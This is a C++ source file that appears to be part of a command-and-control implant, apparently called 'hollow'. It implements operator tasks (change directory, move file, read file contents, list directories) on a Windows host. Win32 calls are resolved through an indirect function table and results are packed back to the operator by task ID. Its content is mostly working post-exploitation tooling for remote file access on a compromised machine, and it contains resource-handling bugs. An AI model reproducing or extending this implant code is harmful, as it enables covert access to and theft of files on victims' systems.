#include "../../../includes/core/core.h"
#include "../../../includes/byte/byte.h"
#include "../../../includes/core/tasker.h"
#include "../../../includes/core/tasker/filesystem.h"
#include "../../../includes/utils/utils.h"


void do_cd() {
	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	INT32 dirLen = packager->Parse4();
	PBYTE dir = utils::mem::Alloc<BYTE>(dirLen);

	//PBYTE dir = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, dirLen);
	packager->ParseBytes(dir, dirLen);

	if (!hollow->Win32.SetCurrentDirectoryA((PCHAR)dir)) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		utils::mem::free(dir);
		return;
	}

	DWORD size = hollow->Win32.GetCurrentDirectoryA(0, NULL);
	PBYTE pwd = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, size);

	DWORD res = hollow->Win32.GetCurrentDirectoryA(size, (PCHAR)pwd);
	if (res == 0 || res >= size) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		utils::mem::free(dir);
		utils::mem::free(pwd);
		return;
	}

	packager->Pack4(OUTPUT_RAW);
	packager->Pack4((INT32)res);
	packager->PackBytes(pwd, (INT32)res);
	if (pwd) { utils::mem::free(pwd); }
	if (dir) { utils::mem::free(dir); }
	return;

}

void do_mv() {
	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	INT32 srclen = packager->Parse4();
	PBYTE src = utils::mem::Alloc<BYTE>(srclen);
	//PBYTE src = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, srclen);
	packager->ParseBytes(src, srclen);
	INT32 dstLen = packager->Parse4();
	PBYTE dst = utils::mem::Alloc<BYTE>(dstLen);
	//PBYTE dst = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, dstLen);
	packager->ParseBytes(dst, dstLen);

	if (!hollow->Win32.MoveFileA((LPCSTR)src, (LPCSTR)dst)) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		utils::mem::free(src);
		utils::mem::free(dst);
		return;
	}
	packager->Pack4(MV_SUCCESS);
	if (src) { utils::mem::free(src); }
	if (dst) { utils::mem::free(dst); }
	return;
}


void do_cat() {
	BOOL result = FALSE;
	HANDLE hFile = NULL;
	//PBYTE buf       = NULL;
	DWORD ChunkSize = 2048;
	DWORD BytesRead = 0;

	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	INT32 strlen = packager->Parse4();
	PBYTE file = utils::mem::Alloc<BYTE>(strlen);
	//PBYTE file = (PBYTE)hollow->Win32.LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, strlen);
	packager->ParseBytes(file, strlen);

	hFile = hollow->Win32.CreateFileA((PCHAR)file, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		DEBUG_LOGA("[!] Failed Opening File");
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		utils::mem::free(file);
		return;
	}

	CHAR buf[2048];
	result = hollow->Win32.ReadFile(hFile, buf, ChunkSize, &BytesRead, NULL);
	if (!result) {
		DEBUG_LOGA("[!] Failed Reading Files");
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		utils::mem::free(file);
		hollow->Win32.CloseHandle(hFile);
		return;
	}

	packager->Pack4(OUTPUT_RAW);
	packager->Pack4((INT32)BytesRead);
	packager->PackBytes((PBYTE)buf, (INT32)BytesRead);

	if (file) { utils::mem::free(file); }
	if (hFile) { utils::mem::free(hFile); }
	return;
}




void do_ls() {
	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	CHAR Path[MAX_PATH];
	WIN32_FIND_DATAA FindData;
	HANDLE hFind = NULL;
	DWORD PathSize = 0;
	DWORD Attributes = 0;
	DWORD EntryType = 0;
	BOOL isNotFile = FALSE;


	INT32 DirLen = packager->Parse4();
	PCHAR dir = utils::mem::Alloc<CHAR>(DirLen);
	packager->ParseBytes(dir, DirLen);

	PathSize = hollow->Win32.GetFullPathNameA(dir, MAX_PATH, Path, NULL);
	Attributes = hollow->Win32.GetFileAttributesA(Path);
	isNotFile = (Attributes != INVALID_FILE_ATTRIBUTES) && !(Attributes & FILE_ATTRIBUTE_DIRECTORY);
	if (!isNotFile) {
		Path[PathSize] = '\\';
		Path[++PathSize] = '*';
		Path[++PathSize] = '\0';
	}

	hFind = hollow->Win32.FindFirstFileA(Path, &FindData);
	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		utils::mem::free(dir);
		return;
	}

	packager->Pack4(OUTPUT_NEEDS_PARSE);
	packager->Pack4(PARSE_LS);
	do {
		if (utils::str::strcmp(FindData.cFileName, "..") == 0 || utils::str::strcmp(FindData.cFileName, ".") == 0)
			continue;
		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			EntryType = 1;
		}
		else if (FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
			EntryType = 2;
		}
		else {
			EntryType = 3;
		}

		INT32 len = (INT32)utils::str::strlen(FindData.cFileName);
		packager->Pack4(len);
		packager->PackBytes((PBYTE)FindData.cFileName, len);
		packager->Pack4(EntryType);
		ULONGLONG Size = ((ULONGLONG)FindData.nFileSizeHigh << 32) | FindData.nFileSizeLow;
		packager->Pack8(Size);
	} while (hollow->Win32.FindNextFileA(hFind, &FindData));
	packager->Pack4(END_SIG);

	if (dir) { utils::mem::free(dir); }


}